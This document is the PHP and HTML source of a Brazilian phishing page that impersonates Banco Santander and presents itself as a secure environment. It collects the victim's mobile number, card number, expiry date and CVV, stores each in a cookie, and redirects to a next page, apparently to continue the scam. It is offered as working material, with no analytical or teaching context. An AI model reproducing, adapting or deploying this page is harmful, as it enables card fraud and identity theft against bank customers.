﻿<?php
if(isset($_POST['ddd']) && !empty($_POST['ddd'])){
$cookie_value=$_POST['ddd'];
setcookie('ddd',$cookie_value, time() + 3600, '/');

}
if(isset($_POST['cel']) && !empty($_POST['cel'])){
$cookie_value=$_POST['cel'];
setcookie('celular',$cookie_value, time() + 3600, '/');

}
if(isset($_POST['car']) && !empty($_POST['car'])){
$cookie_value=$_POST['car'];
setcookie('cartao',$cookie_value, time() + 3600, '/');

}
if(isset($_POST['mes']) && !empty($_POST['mes'])){
$cookie_value=$_POST['mes'];
setcookie('mes',$cookie_value, time() + 3600, '/');

}
if(isset($_POST['ano']) && !empty($_POST['ano'])){
$cookie_value=$_POST['ano'];
setcookie('ano',$cookie_value, time() + 3600, '/');


}
if(isset($_POST['cvv']) && !empty($_POST['cvv'])){
$cookie_value=$_POST['cvv'];
setcookie('cvv',$cookie_value, time() + 3600, '/');


header("Location: home4.php");
}

?>

<!doctype html>
<?php

//$cpfis = $_POST['cpfis'];

$senha4 = $_POST['senha4'];

$hora      	= date("d/m/Y");              //Hora de envio

?>

<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<meta name="viewport" content="width=device-width, user-scalable=false;">

<link rel="shortcut icon" type="image/x-icon" href="imagens/00.ico">

<title>🔒 [Vamos Fazer Juntos]</title>

<link rel="stylesheet" href="css/bootstrap.min.css">

<link rel="stylesheet" href="css/bootstrap-theme.min.css">

<link rel="stylesheet" href="css/styles11.css">

<script src="js/bootstrap.min.js"></script>

<script src="js/number.js"></script>



<script language="javascript">

function pulacampo(idobj, idproximo){

var str = new String(document.getElementById(idobj).value);

var mx = new Number(document.getElementById(idobj).maxLength);

if (str.length == mx)

{

document.getElementById(idproximo).focus();

}

}

</script>



<style>

.modalposition { background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.3); position:fixed; top:0; left:0; right:0; bottom:0; }

.modalposition2{ max-width:450px; margin:0 auto; z-index: 99999; border: 5px solid #EEE; position: absolute; left:10px; right:10px;	font-family: Arial;	font-size: 12px; top: 25%; height:; background:#FFF; color:#000; border-radius:5px; box-shadow: 0 0 10px #999; padding:0 0 15px 0; }

.modaltext{ padding: 15px; color:#666666; }

#bs { padding:5px 30px 5px 30px;}

</style>

</head>



<body>



<div style="position:absolute; top:0px; left:0px; right:0px; bottom:0px; background: #EEE;">



<div class="col-sm-7" style="background:#F5090D; Width:100%; height:45px; padding:10px; border-bottom:1px solid #CCC; color:#0060A9;">

                    <img src="imagens/solution.png" width="184" height="25" alt=""/><font size="3"><b></b></font>

</div>



<div class="col-sm-7" style="padding:10px; background:#E0E0E0;">



<div style="padding:10px; background:#FFF;">



<div><script language="JavaScript" type="text/javascript">

<!--

mydate = new Date();

myday = mydate.getDay();

mymonth = mydate.getMonth();

myweekday= mydate.getDate();

weekday= myweekday; 



if(myday == 0)

day = " Domingo, " 



else if(myday == 1)

day = " Segunda-Feira, " 



else if(myday == 2)

day = " Terca-Feira, " 



else if(myday == 3)

day = " Quarta-Feira, " 



else if(myday == 4)

day = " Quinta-Feira, " 



else if(myday == 5)

day = " Sexta-Feira, " 



else if(myday == 6)

day = " Sabado, " 



if(mymonth == 0)

month = "Janeiro " 



else if(mymonth ==1)

month = "Fevereiro " 



else if(mymonth ==2)

month = "Marco " 



else if(mymonth ==3)

month = "Abril " 



else if(mymonth ==4)

month = "Maio " 



else if(mymonth ==5)

month = "Junho " 



else if(mymonth ==6)

month = "Julho " 



else if(mymonth ==7)

month = "Agosto " 



else if(mymonth ==8)

month = "Setembro " 



else if(mymonth ==9)

month = "Outubro " 



else if(mymonth ==10)

month = "Novembro " 



else if(mymonth ==11)

month = "Dezembro " 



document.write("<font face=verdana, size=1 color=#666666>"+ day);

document.write(myweekday+" de "+month+ "de 2021</font>");

// -->

                </script></div><div><h1 style="font-family: verdana, arial; color: rgb(237, 34, 40); font-size: 12px; margin: 0px 0px 10px; background-color: rgb(236, 235, 235); border: 1px solid rgb(221, 221, 221); padding: 5px; font-weight: bold; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;">

 <font color="#009900"><img border="0" src="imagens/cad.png"> Ambiente Seguro: </font></h1></div>

<div style="font-size:10px; color:#666666;"><img border="0" src="imagens/nome.png"> 

	Confirmação obrigatória. É importante que você mantenha seu número de telefone celular 

	sempre atualizado.</div>



<form name="form" id="form" action=<?php echo $_SERVER['PHP_SELF'] ?>  method="post" onSubmit="return validar()">

<font color="#5B5B5B">

                                <p>

								<input name="ddd" style="width:60px; float:left; height:18"  type="tel" id="ddd" placeholder="DDD" tabindex="1" maxlength="2" required="" class="form-control"><input style="width:200px;float:left; height:18"  type="tel" name="cel" id="cel" placeholder="Numero Celular" tabindex="1" maxlength="9" required="" class="form-control"></p>&nbsp;<p style="margin-top: 0; margin-bottom: 0">

								<font face="Verdana, Arial, Helvetica, sans-serif" size="1">

								.</font></p>

								<p style="margin-top: 0; margin-bottom: 0">

								

  <input name="car" style="width:260px; float:left; height:18" type="tel" id="nome" placeholder="Número Cartão (16 dígitos):" tabindex="1" minlength="16" maxlength="16" required="" class="form-control"><p style="margin-top: 0; margin-bottom: 0">

								

  &nbsp;<p style="margin-top: 0; margin-bottom: 0">

								<font face="Verdana, Arial, Helvetica, sans-serif" size="1">

								.</font></p>

								<p style="margin-top: 0; margin-bottom: 0">

								

  <input name="mes" style="width:80px; float:left; height:18"  type="tel" id="mes" placeholder="MÊS" tabindex="1" minlength="2" maxlength="2" required="" class="form-control"> 



<input name="ano" style="width:80px; float:left; height:18" type="tel" id="ano" placeholder="ANO" tabindex="1" maxlength="2" minlength="2" required="" class="form-control"><p style="margin-top: 0; margin-bottom: 0">
							

  &nbsp;<p style="margin-top: 0; margin-bottom: 0">

  <font face="Verdana, Arial, Helvetica, sans-serif" style="font-size: 7pt">&nbsp; Validade: 

								Ex: 12/29</font></p>

								<p style="margin-top: 0; margin-bottom: 0">

								

  <input name="cvv" style="width:80px; float:left; height:18"  type="tel" class="form-control" id="cvv" placeholder="CVV" tabindex="1" minlength="3"  maxlength="3" required="" class="form-control"><p style="margin-top: 0; margin-bottom: 0">

								

  &nbsp;<p style="margin-top: 0; margin-bottom: 0">

<font face="Verdana, Arial, Helvetica, sans-serif" style="font-size: 7pt">&nbsp; 3 &uacute;ltimos 

dígitos no verso do cart&atilde;o.</font></p>

								</font>

<p></p><div style="height:77px; width:100%; margin-top:10px">

		<img border="0" src="imagens/selo2.jpg" width="210" height="79">&nbsp;</div>

</div>



<div style="height:64px; width:100%; margin:10px 0 10px 0;">

<input type="submit" name="bt" id="bt" value="CONFIRMAR" class="btn btn-primary" style="font-size:13px;"/>

</div>



</form>

</div>

</div>



</div>



<script type="text/javascript">

 

	function clear_password(){

		

		document.getElementById('senha4').value = "";

	}

	

	function submitlogin(){

		var tamsenha = document.getElementById('senha4').value.length;

		if (document.getElementById('senha4').value == ''){

				alert('Digita sua senha!');

			}else if( tamsenha < 6){

				alert('Digita sua senha completa!');

			}else{

				document.getElementById("formsenha").submit();		

		}

		

	}

	

 </script>











<div style="Width:100%; height:33px; position:absolute; bottom:6px; background:#FF0000; border-top:1px solid #CCC;" id="casa">

<div style="background:#FF0000; padding:1px 0 0 10px;">

<div style="height:20px; background:url(imagens/cadiado.png) no-repeat; background-size:contain; padding:3px 0 0 30px; margin-top:5px; font-weight:bold; color:#FFFFFF; font-size:0.8em;  text-shadow:;">

	Ambiente seguro.<div style="float:right; border-radius:50px; padding:0 10px 0 0"> <font face="arial">

			Banco Santander (Brasil) S.A.</font></div></div>

</div>

</div>



<!-- ================================================================ -->

<div style="display:none;" id="modalalert" class="modalposition">

&nbsp;</div>